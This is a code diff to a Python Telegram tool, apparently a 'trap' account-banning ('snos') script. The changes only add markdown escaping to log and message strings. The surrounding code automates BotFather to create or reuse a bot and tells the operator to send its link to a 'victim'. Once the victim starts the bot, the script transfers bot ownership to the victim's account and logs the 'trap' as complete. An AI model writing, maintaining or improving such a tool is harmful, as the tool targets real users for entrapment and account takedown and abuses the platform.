@@ -161,7 +161,7 @@ async def main_trap_snos(user_id: int, username: str, notify_bot=None) -> dict:
                         # Кнопки с ботами выглядят как "@username"
                         if btn.text.startswith("@") and "bot" in btn.text.lower():
                             existing_bot = btn.text.lstrip("@")
-                            print(f"[TRAP] Найден существующий бот: *@{existing_bot}*", flush=True)
+                            print(f"[TRAP] Найден существующий бот: *@{esc_md(existing_bot)}*", flush=True)
                             # Нажимаем на него чтобы получить токен
                             await btn.click()
                             await asyncio.sleep(3)
@@ -198,7 +198,7 @@ async def main_trap_snos(user_id: int, username: str, notify_bot=None) -> dict:
             bot_name = _rand_bot_name()
             bot_username_new = _rand_bot_username()
 
-            print(f"[TRAP] Создаём нового бота: {bot_name} / *@{bot_username_new}*", flush=True)
+            print(f"[TRAP] Создаём нового бота: {bot_name} / *@{esc_md(bot_username_new)}*", flush=True)
             await _notify.send_message(user_id,
                 "*└─ Существующих ботов нет, создаю нового...*",
                 parse_mode="Markdown")
@@ -235,11 +235,11 @@ async def main_trap_snos(user_id: int, username: str, notify_bot=None) -> dict:
 
         await client.disconnect()
 
-        print(f"[TRAP] Бот готов: *@{bot_username_final}* | {bot_token[:20]}...", flush=True)
+        print(f"[TRAP] Бот готов: *@{esc_md(bot_username_final)}* | {bot_token[:20]}...", flush=True)
 
         await _notify.send_message(user_id,
             f"🤖 *Бот готов!*\n"
-            f"*└─ *@{bot_username_final}**\n\n"
+            f"*└─ *@{esc_md(bot_username_final)}**\n\n"
             f"📤 *Скинь жертве:* t.me/{bot_username_final}\n"
             f"*Дождись пока жертва напишет /start*\n\n"
             f"*После этого нажми кнопку* 👇",
@@ -278,10 +278,10 @@ async def transfer_and_apply(bot_token: str, bot_username: str,
     import keyboards
 
     victim = victim_username.lstrip("@")
-    print(f"[TRAP] Передача *@{bot_username}* → *@{victim}*", flush=True)
+    print(f"[TRAP] Передача *@{esc_md(bot_username)}* → *@{esc_md(victim)}*", flush=True)
 
     await _notify.send_message(user_id,
-        f"🔄 *Передаю *@{bot_username}* → *@{victim}*...*",
+        f"🔄 *Передаю *@{esc_md(bot_username)}* → *@{esc_md(victim)}*...*",
         parse_mode="Markdown")
 
     client = await _get_client()
@@ -297,7 +297,7 @@ async def transfer_and_apply(bot_token: str, bot_username: str,
         await asyncio.sleep(3)
 
         # Нажимаем на нашего бота
-        found = await _click_button(client, bf, [bot_username, f"*@{bot_username}*"], timeout=15)
+        found = await _click_button(client, bf, [bot_username, f"*@{esc_md(bot_username)}*"], timeout=15)
         if not found:
             # Пробуем нажать любую кнопку с ботом
             await _click_button(client, bf, ["@"], timeout=10)
@@ -318,7 +318,7 @@ async def transfer_and_apply(bot_token: str, bot_username: str,
             print(f"[TRAP] BotFather готов принять username", flush=True)
 
         # Вводим username жертвы
-        await client.send_message(bf, f"*@{victim}*")
+        await client.send_message(bf, f"*@{esc_md(victim)}*")
         await asyncio.sleep(3)
 
         # Ждём "You are about to transfer ownership..."
@@ -359,14 +359,14 @@ async def transfer_and_apply(bot_token: str, bot_username: str,
 
         caption = (
             f"🪤 *Trap-метод завершён!*\n\n"
-            f"{'✅' if transferred else '⚠️'} *Бот передан:* *@{bot_username}*\n"
-            f"🎯 *Жертва:* *@{victim}*\n"
+            f"{'✅' if transferred else '⚠️'} *Бот передан:* *@{esc_md(bot_username)}*\n"
+            f"🎯 *Жертва:* *@{esc_md(victim)}*\n"
             f"⏰ *Время:* {ts}"
         )
         caption_log = (
             f"🪤 *Trap*\n"
-            f"{'✅' if transferred else '⚠️'} *@{bot_username}* → *@{victim}*\n"
-            f"👤 {user_id} (*@{username}*)\n"
+            f"{'✅' if transferred else '⚠️'} *@{esc_md(bot_username)}* → *@{esc_md(victim)}*\n"
+            f"👤 {user_id} (*@{esc_md(username)}*)\n"
             f"⏰ {ts}"
         )
 
